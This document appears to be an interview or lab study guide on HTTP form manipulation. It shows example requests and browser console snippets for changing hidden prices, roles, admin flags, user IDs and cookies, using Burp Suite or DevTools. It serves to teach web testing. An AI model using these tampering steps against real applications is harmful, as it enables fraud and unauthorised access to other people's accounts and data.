# Challenge 5: HTTP Form Manipulation

> **Difficulty:** 🟢 EASY | **Success Ratio:** 100%
> **Goal:** Manipulate form data sent to the server to bypass restrictions or alter application behavior.

---

## What They Test

Can you intercept and modify HTTP requests to change form values (hidden fields, prices, roles, etc.) that the application trusts without proper server-side validation?

---

## Key Concept

Web forms often include data that the developer assumes the user cannot modify — hidden fields, disabled fields, preset values. But **anything sent from the browser can be modified** using a proxy like Burp Suite.

---

## Methodology

### Step 1: Inspect the Form (View Source)

```html
<!-- Look for these in page source (Ctrl+U or F12) -->

<!-- Hidden fields - PRIME TARGET -->
<input type="hidden" name="price" value="99.99">
<input type="hidden" name="role" value="user">
<input type="hidden" name="isAdmin" value="false">
<input type="hidden" name="discount" value="0">
<input type="hidden" name="user_id" value="1001">
<input type="hidden" name="quantity" value="1">

<!-- Disabled/readonly fields -->
<input type="text" name="email" value="user@test.com" disabled>
<input type="text" name="total" value="500" readonly>

<!-- Select with limited options -->
<select name="role">
    <option value="user">User</option>
    <!-- Can we add value="admin"? -->
</select>

<!-- Max length restrictions -->
<input type="text" name="comment" maxlength="50">
```

### Step 2: Intercept with Burp Suite

```
1. Start Burp Suite → Proxy → Intercept is ON
2. Configure browser to use proxy (127.0.0.1:8080)
3. Fill out the form in the browser normally
4. Click Submit → request is intercepted in Burp
5. Modify the desired values in the raw HTTP request
6. Click "Forward" to send the modified request
```

### Step 3: Common Modifications

#### Changing Prices
```http
POST /checkout HTTP/1.1
Host: target.com

item=widget&quantity=1&price=99.99&total=99.99

# MODIFY TO:
item=widget&quantity=1&price=0.01&total=0.01
```

#### Changing User Roles
```http
POST /register HTTP/1.1
Host: target.com

username=attacker&password=test123&role=user

# MODIFY TO:
username=attacker&password=test123&role=admin
```

#### Changing Boolean Flags
```http
POST /updateprofile HTTP/1.1
Host: target.com

name=John&email=john@test.com&isAdmin=false&isPremium=false

# MODIFY TO:
name=John&email=john@test.com&isAdmin=true&isPremium=true
```

#### Adding Extra Parameters
```http
POST /register HTTP/1.1

username=attacker&password=test123

# ADD:
username=attacker&password=test123&role=admin&isAdmin=true
# Sometimes the app accepts parameters it didn't originally send!
```

#### Changing User IDs (IDOR)
```http
POST /viewprofile HTTP/1.1

user_id=1001

# MODIFY TO (view another user's profile):
user_id=1002
user_id=1
user_id=admin
```

---

## Different Form Encoding Types

### URL-Encoded (Most Common)
```http
Content-Type: application/x-www-form-urlencoded

name=John&price=100&role=user
# Just change values directly
```

### JSON Body
```http
Content-Type: application/json

{"name": "John", "price": 100, "role": "user"}

# MODIFY TO:
{"name": "John", "price": 0.01, "role": "admin"}
```

### Multipart Form Data (File Uploads)
```http
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="price"

99.99
------WebKitFormBoundary
Content-Disposition: form-data; name="role"

user
------WebKitFormBoundary--

# Modify the values between the boundary lines
```

### XML Body
```http
Content-Type: application/xml

<order>
    <item>widget</item>
    <price>99.99</price>
    <role>user</role>
</order>

# MODIFY the XML values
```

---

## Method-Based Manipulation

### Changing HTTP Method
```http
# Original: POST request
POST /delete_user HTTP/1.1
# If POST is blocked, try:
GET /delete_user?id=1 HTTP/1.1
PUT /delete_user HTTP/1.1
```

### Method Override Headers
```http
POST /api/resource HTTP/1.1
X-HTTP-Method-Override: DELETE
X-Method-Override: PUT
X-HTTP-Method: PATCH
```

---

## Cookie Manipulation

```http
# Original cookies
Cookie: session=abc123; role=user; isAdmin=false

# Modify cookies in Burp:
Cookie: session=abc123; role=admin; isAdmin=true

# Or in browser (F12 → Console):
document.cookie = "role=admin";
document.cookie = "isAdmin=true";
```

---

## DevTools Method (Alternative to Burp)

```
Method 1: Edit HTML directly
1. F12 → Elements tab
2. Find the hidden input
3. Double-click the value → change it
4. Submit the form normally

Method 2: Console
document.querySelector('input[name="price"]').value = "0.01";
document.querySelector('input[name="role"]').value = "admin";
document.querySelector('form').submit();

Method 3: Remove restrictions
// Remove disabled attribute
document.querySelector('input[name="email"]').removeAttribute('disabled');
// Remove readonly
document.querySelector('input[name="total"]').removeAttribute('readonly');
// Remove maxlength
document.querySelector('input[name="comment"]').removeAttribute('maxlength');
```

---

## Common Lab Scenarios

| Scenario          | What to Modify     | Expected Result              |
| ----------------- | ------------------ | ---------------------------- |
| Shopping cart     | `price=0.01`       | Buy item for pennies         |
| User registration | `role=admin`       | Register as admin            |
| Profile update    | `isAdmin=true`     | Gain admin access            |
| Voting/rating     | `votes=99999`      | Manipulate results           |
| Coupon/discount   | `discount=100`     | Get item free                |
| Transfer money    | `amount=-100`      | Receive money instead        |
| File download     | `file_id=2` (IDOR) | Download someone else's file |

---

## Tips for the Interview

1. **Always check page source FIRST** — hidden fields are the most common target
2. **Use Burp Suite** — it's the expected tool for this challenge
3. **Try adding parameters** that don't exist in the form — apps sometimes accept extra params
4. **Test negative values** — entering `-100` for a price can sometimes credit your account
5. **Check both request AND response** — modifying the response can also bypass checks
6. **Don't forget cookies** — role/permission info is often stored in cookies too
